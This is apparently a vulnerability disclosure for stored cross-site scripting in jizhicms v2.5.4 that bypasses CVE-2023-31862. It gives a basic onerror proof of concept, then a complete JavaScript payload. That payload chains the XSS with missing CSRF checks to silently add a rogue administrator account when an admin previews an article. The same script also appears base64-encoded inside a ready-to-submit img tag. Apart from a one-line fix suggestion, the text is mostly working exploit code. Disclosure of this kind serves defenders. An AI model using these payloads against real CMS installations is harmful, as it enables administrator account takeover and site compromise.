jizhicms v2.5.4 is vulnerable to cross-site Scripting (XSS) attacks.   The backend does not rigorously verify the content of the published articles, which allows the attacker to bypass CVE-2023-31862, which allows the attacker to obtain sensitive user information by modifying the request package to publish articles containing malicious JavaScript.  However, the backend administrator clicking on the article preview will launch this malicious JavaScript script and if a backend administrator passes the post review it will affect all users.
![image](https://github.com/7vventy0ne/personalTest/assets/83335402/f557b69b-074e-401c-94e8-85654d8a0dc3)

When submitting, you can see that the post request sent is:
![1](https://github.com/7vventy0ne/personalTest/assets/83335402/2e20f5ab-d5c1-4aef-b9a9-f4ab09d607dd)


Modify the submitted content to:
```
<p><img+src=1+onerror=confirm(1)></p>
```
![2](https://github.com/7vventy0ne/personalTest/assets/83335402/d266620e-1a6b-403a-af80-43aba77ccc4c)





At this point, if the administrator previews the submitted article, a pop-up window will appear. 
![image](https://github.com/7vventy0ne/personalTest/assets/83335402/69682576-7844-445e-b10a-4d69a3f55586)


At this point, it indicates that the embedded JavaScript script has been maliciously executed
I know that the entire system's cookies have been set to HttpOnly, which makes it impossible to obtain cookies through JavaScript scripts. 
However, there is a function to add administrator in the administrator background, which does not strictly verify csrf, thus we can inject malicious js code in the article to cause unauthorized administrator user to be added

```
<p></p>
<script>
const formData = new FormData();
formData.append('name', 'hacker');
formData.append('tel', '13999999999');
formData.append('email', '123@123.com');
formData.append('gid', '1');
formData.append('pass', 'admin');
formData.append('repass', 'admin');
formData.append('status', '1');
formData.append('go', '1');


fetch('http://192.168.164.14/index.php/admins/Admin/adminadd.html', {
    method: 'POST',
    mode: 'same-origin', 
    credentials: 'include', 
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    },
    body: new URLSearchParams(formData).toString()
})
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        console.log('Success:', data);
    })
    .catch(error => {
        console.error('There has been a problem with your fetch operation:', error);
    });
</script>
```
The payload is :
```
<p><img+src="1"+onerror="document.write(atob('PHA%2BPC9wPgo8c2NyaXB0Pgpjb25zdCBmb3JtRGF0YSA9IG5ldyBGb3JtRGF0YSgpOwpmb3JtRGF0YS5hcHBlbmQoJ25hbWUnLCAnaGFja2VyJyk7CmZvcm1EYXRhLmFwcGVuZCgndGVsJywgJzEzOTk5OTk5OTk5Jyk7CmZvcm1EYXRhLmFwcGVuZCgnZW1haWwnLCAnMTIzQDEyMy5jb20nKTsKZm9ybURhdGEuYXBwZW5kKCdnaWQnLCAnMScpOwpmb3JtRGF0YS5hcHBlbmQoJ3Bhc3MnLCAnYWRtaW4nKTsKZm9ybURhdGEuYXBwZW5kKCdyZXBhc3MnLCAnYWRtaW4nKTsKZm9ybURhdGEuYXBwZW5kKCdzdGF0dXMnLCAnMScpOwpmb3JtRGF0YS5hcHBlbmQoJ2dvJywgJzEnKTsKCgpmZXRjaCgnaHR0cDovLzE5Mi4xNjguMTY0LjE0L2luZGV4LnBocC9hZG1pbnMvQWRtaW4vYWRtaW5hZGQuaHRtbCcsIHsKICAgIG1ldGhvZDogJ1BPU1QnLAogICAgbW9kZTogJ3NhbWUtb3JpZ2luJywgCiAgICBjcmVkZW50aWFsczogJ2luY2x1ZGUnLCAKICAgIGhlYWRlcnM6IHsKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCcsCiAgICAgICAgJ1gtUmVxdWVzdGVkLVdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnCiAgICB9LAogICAgYm9keTogbmV3IFVSTFNlYXJjaFBhcmFtcyhmb3JtRGF0YSkudG9TdHJpbmcoKQp9KQogICAgLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgIGlmICghcmVzcG9uc2Uub2spIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdOZXR3b3JrIHJlc3BvbnNlIHdhcyBub3Qgb2snKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKTsKICAgIH0pCiAgICAudGhlbihkYXRhID0%2BIHsKICAgICAgICBjb25zb2xlLmxvZygnU3VjY2VzczonLCBkYXRhKTsKICAgIH0pCiAgICAuY2F0Y2goZXJyb3IgPT4gewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ1RoZXJlIGhhcyBiZWVuIGEgcHJvYmxlbSB3aXRoIHlvdXIgZmV0Y2ggb3BlcmF0aW9uOicsIGVycm9yKTsKICAgIH0pOwo8L3NjcmlwdD4%3D'))"></p>
```
![image](https://github.com/7vventy0ne/personalTest/assets/83335402/c264a103-5c73-4317-b184-73ffadfb9fce)



Administrator clicks on preview:
![image](https://github.com/7vventy0ne/personalTest/assets/83335402/4b61f260-2b86-4108-9aa8-d65d0a5dbe6b)

Check the admin list to see that the malicious user has been successfully added:
![image](https://github.com/7vventy0ne/personalTest/assets/83335402/9d004c06-f859-4ffc-9e84-28ba8df1808c)

Modification suggestions:
Filter the content of the backend output

